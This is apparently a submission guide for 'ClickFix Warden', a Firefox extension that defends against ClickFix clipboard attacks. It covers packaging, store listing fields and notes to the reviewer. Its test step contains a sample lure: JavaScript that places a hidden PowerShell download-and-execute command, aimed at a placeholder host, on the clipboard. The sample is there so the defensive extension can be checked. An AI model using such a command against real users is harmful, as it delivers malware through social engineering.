# Firefox Add-ons (AMO)

Submit at https://addons.mozilla.org/developers/ as a listed add-on.

## Files to upload

- Add-on package, `.output/clickfix-warden-<version>-firefox.zip`
- Source code, `.output/clickfix-warden-<version>-sources.zip`. AMO asks for it because the code is bundled with Vite.

## Listing

- Name, ClickFix Warden
- Summary, the 250 character text from `listing.md`
- Description, from `listing.md`, add the Bulgarian translation as well
- Categories, Privacy & Security
- Support website, https://github.com/xVoidByte/clickfix-warden/issues
- Homepage, https://github.com/xVoidByte/clickfix-warden
- License, MIT
- Privacy policy, paste the text from https://xvoidbyte.github.io/clickfix-warden/privacy.html
- Screenshots, `store/screenshots/1-*.png` to `5-*.png`
- Data collection, the manifest declares `data_collection_permissions` as `none`, which matches the privacy policy

## Notes to reviewer

```
Build instructions
  Requirements: Node.js 22 or newer and npm 10 or newer, on Windows, macOS or Linux.
  1. Unpack the source archive
  2. npm ci
  3. npm run build:firefox
  The built add-on is in .output/firefox-mv3 and matches the uploaded package.

What the extension downloads
  Once an hour it fetches hot-delta.json (or hot.json) and rules.json from https://xvoidbyte.github.io/clickfix-warden/v1/,
  once a day bulk.json, each with its .sig file. All of them are JSON data verified with Ed25519 against the key in src/feed/public-key.ts,
  and are never evaluated as code.

How to test
  Open any page, open the web console, run the line below and click the page within three seconds
  setTimeout(() => navigator.clipboard.writeText('powershell -w h -c "iwr https://x.example.invalid/a.ps1 | iex" # I am not a robot'), 3000)
  A warning appears in the page and pasting gives a harmless note instead of the command.

Why the page-world script
  entrypoints/page-hooks.content.ts runs in the MAIN world to wrap the clipboard functions before page
  scripts can use them. It only reads the text a page tries to copy and asks the isolated script for a
  verdict, it does not change anything else on the page.
```
